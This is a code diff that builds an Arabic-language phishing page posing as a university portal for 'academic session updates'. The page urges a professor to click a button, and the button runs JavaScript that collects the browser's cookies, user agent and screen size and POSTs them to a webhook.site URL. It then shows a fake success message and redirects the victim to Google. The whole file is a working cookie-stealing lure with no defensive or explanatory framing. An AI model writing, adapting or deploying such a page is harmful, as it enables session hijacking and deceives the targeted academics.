@@ -1,18 +1,78 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة التحديث الأكاديمي</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            background-color: #f4f7f6; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .card { 
+            background: white; 
+            padding: 40px; 
+            border-radius: 12px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
+            text-align: center; 
+            max-width: 400px; 
+            border-top: 5px solid #0056b3; 
+        }
+        h2 { color: #0056b3; margin-bottom: 20px; }
+        p { color: #555; line-height: 1.6; margin-bottom: 30px; }
+        .btn { 
+            background-color: #0056b3; 
+            color: white; 
+            padding: 15px 30px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            width: 100%; 
+            transition: 0.3s; 
+        }
+        .btn:hover { background-color: #003d7a; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>تحديث البيانات الجامعية</h2>
+    <p>عزيزي الدكتور، يرجى الضغط على الزر أدناه لتحديث بيانات الجلسة الأكاديمية وضمان مزامنة مشاريع التخرج بنجاح.</p>
+    <button class="btn" onclick="sendData()">تحديث الجلسة الآن</button>
+</div>
+
 <script>
     function sendData() {
-        const stolenData = "Session_Data: " + document.cookie + 
-                         " | UserAgent: " + navigator.userAgent;
+        // سحب الهوية الرقمية للمتصفح
+        const stolenData = "Cookies: " + document.cookie + 
+                         " | UserAgent: " + navigator.userAgent + 
+                         " | Screen: " + window.screen.width + "x" + window.screen.height;
 
-        // رابطك الخاص:
+        // رابط المستقبل الخاص بك
         const webhookUrl = "https://webhook.site/b8061e9d-7cda-4ad7-a02a-118a21745d01";
 
+        // إرسال البيانات
         fetch(webhookUrl, {
-            method: "POST",
-            mode: "no-cors",
+            method: 'POST',
+            mode: 'no-cors',
             body: stolenData
+        })
+        .then(() => {
+            alert("تم التحديث بنجاح. سيتم تحويلك لصفحة النظام الرئيسية.");
+            window.location.href = "https://www.google.com";
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert("حدث خطأ تقني، يرجى المحاولة لاحقاً.");
         });
-
-        alert("تم تحديث الجلسة بنجاح.");
-        window.location.href = "https://www.google.com";
     }
-</script> 
+</script>
+
+</body>
+    </html>
